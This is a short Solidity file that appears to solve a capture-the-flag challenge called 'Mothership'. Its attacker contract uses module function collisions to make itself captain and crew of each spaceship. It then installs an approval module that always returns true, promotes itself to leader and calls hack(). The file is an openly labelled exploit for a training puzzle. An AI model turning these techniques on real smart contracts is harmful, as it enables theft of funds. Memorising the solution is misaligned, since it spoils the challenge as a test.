// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../ChallengeMothership.sol";

contract ChallengeMothershipAttacker {
    Mothership public immutable mothership;

    constructor(address _mothership) {
        mothership = Mothership(_mothership);
    }

    function attack() external {
        LeadershipModuleAttacker newLeadershipModule = new LeadershipModuleAttacker();

        for (uint256 i; i < mothership.fleetLength(); i++) {
            SpaceShip spaceShip = mothership.fleet(i);

            // Assign the attacker as the captain to modify the approve module for the spaceship
            CleaningModule(address(spaceShip)).replaceCleaningCompany(address(this));
            spaceShip.addModule(LeadershipModule.isLeaderApproved.selector, address(newLeadershipModule));

            // We need one spaceship to be the candidate for being the leader
            // There can't be more than one spaceship with the same captain
            if (i == 0) {
                // Reset the captain. It is needed in order to assign a new one
                CleaningModule(address(spaceShip)).replaceCleaningCompany(address(0x0));
                // Assign the attacker as a crew member. It will be needed to vote for a new captain
                RefuelModule(address(spaceShip)).addAlternativeRefuelStationsCodes(uint160(address(this)));
                // Assign the captain and make the mothership know about it
                spaceShip.askForNewCaptain(address(this));
            }
        }

        // Everything is set up now to promote to the attacker to a leader
        // All spaceships have an approve module that returns true
        // There is one spaceship with a captain that can be promoted to leader
        mothership.promoteToLeader(address(this));
        mothership.hack();
    }
}

contract LeadershipModuleAttacker {
    function isLeaderApproved(address) external pure returns (bool) {
        return true;
    }
}
